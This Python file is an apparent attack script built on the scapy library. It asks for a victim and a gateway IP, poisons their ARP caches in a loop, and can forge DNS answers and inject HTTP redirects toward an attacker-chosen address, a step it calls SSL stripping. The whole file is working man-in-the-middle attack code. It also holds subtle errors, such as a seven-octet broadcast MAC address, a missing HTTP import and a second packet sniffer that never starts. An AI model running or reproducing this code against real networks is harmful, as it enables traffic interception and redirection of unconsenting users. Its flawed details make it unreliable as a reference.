import sys
import time
from scapy.all import *
from scapy.layers.dns import DNS, DNSRR
# from scapy.layers.http import HTTP, HTTPRequest, TCP, Raw
from scapy.layers.inet import IP, UDP, TCP, Raw
from scapy.layers.l2 import Ether, ARP

def getOwnMacIP(iface):
    ipOwn = get_if_addr(iface)
    macOwn = get_if_hwaddr(iface)
    return ipOwn, macOwn

def getMacAddress(ipAdd, iface):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff:ff") / ARP(pdst=ipAdd)
    received, unanswered = srp(packet, iface=iface, timeout=2)
    for sent, received in received:
        return received[Ether].src

def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof):
    # Build Packet
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macTarget
    arp[ARP].pdst = ipTarget

    # Send Packet
    sendp(arp, iface="enp0s3")

def dnsSpoof(pkt):
    if pkt.haslayer(DNSQR) and pkt[IP].src == ipVictim and pkt[DNS].qr == 0:
        print("[+] Intercepted DNS Query: {}".format(pkt[DNSQR].qname))
        
#         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
#             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
#             DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=ipSpoofed))
        
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ipSpoofed))
        
        send(spoofed_pkt, verbose=0)
        print("[+] Sent Spoofed DNS Response: {}".format(spoofed_pkt[DNSRR].rdata))
  
  
def sslStrip(pkt):
    if pkt.haslayer(HTTPRequest) and pkt[IP].src == ipVictim:
        if pkt[HTTPRequest].Method.decode() == "GET":
            strip_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport, flags="PA") / \
                Raw(load="HTTP/1.1 301 Moved Permanently\r\nLocation: http://" + ipSpoofed + "/\r\n\r\n")
            send(strip_pkt, verbose=0)


def attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode=None, ipSpoofed=None):
    try:
        if type_attack == 0:
            print("Initialised ARP Poisoning...")
            if opMode == 0:
              while True:
                  sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway)
                  sendPoisonPacket(ipAttacker, macAttacker, ipGateway, macGateway, ipVictim)
                  time.sleep(2)
            else:
              while True:
                sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway)
                time.sleep(2)
        else:
            print("Initialised DNS Spoofing with SSL Stripping...")
            sniff(filter="udp port 53", prn=dnsSpoof, iface=iface)
            sniff(filter="tcp port 80", prn=sslStrip, iface=iface)
    except KeyboardInterrupt:
        print("Stopped ARP Poisoning" if type_attack == 0 else "Stopped DNS Spoofing with SSL Stripping")

# User input provides network interface, IP addresses
type_attack = raw_input("Type ARP for ARP spoofing, DNS for DNS spoofing ").lower()
if type_attack == "arp":
  type_attack = 0
else:
  type_attack = 1
iface = raw_input("Enter Network Interface: ")
ipVictim = raw_input("Enter Victim IP: ")
ipGateway = raw_input("Enter Gateway IP: ")
if type_attack == 0:
  opMode = int(raw_input("Enter Operational Mode (0: silent, 1: all out): "))
  ipSpoofed = None
else:
    opMode = None
    ipSpoofed = raw_input("Enter the IP to spoof: ")

# Find IP and MAC addresses
ipAttacker, macAttacker = getOwnMacIP(iface)
macGateway = getMacAddress(ipGateway, iface)
macVictim = getMacAddress(ipVictim, iface)

# Send poison packets
attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode, ipSpoofed)
